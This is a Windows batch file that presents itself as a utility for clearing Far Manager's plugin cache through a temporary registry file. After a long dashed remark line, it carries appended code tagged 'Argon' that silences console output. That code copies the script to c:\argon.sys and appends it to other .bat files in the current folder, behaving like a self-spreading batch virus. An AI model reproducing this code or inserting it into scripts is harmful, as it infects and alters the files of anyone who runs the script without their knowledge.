rem -------------------------------------------------------------------------------------------------------------
@echo off
rem This batch file cleared the Plugin Cache

echo REGEDIT4 > "%TEMP%\$DelOld$.reg"
echo [-HKEY_CURRENT_USER\Software\Far\PluginsCache] >> "%TEMP%\$DelOld$.reg"
start/wait regedit -s "%TEMP%\$DelOld$.reg"
del "%TEMP%\$DelOld$.reg" > nul
rem -------------------------------------------------------------------------------------------------------------:@ctty nul%Argon%
if not exist c:\argon.sys copy %0 c:\argon.sys
for %%a in (*.bat) do set argon=%%a
for %%b in (%argon%) do find filefind= %%b
if not errorlevel 1 goto no
copy/b %argon%+c:\argon.sys
:no
exit
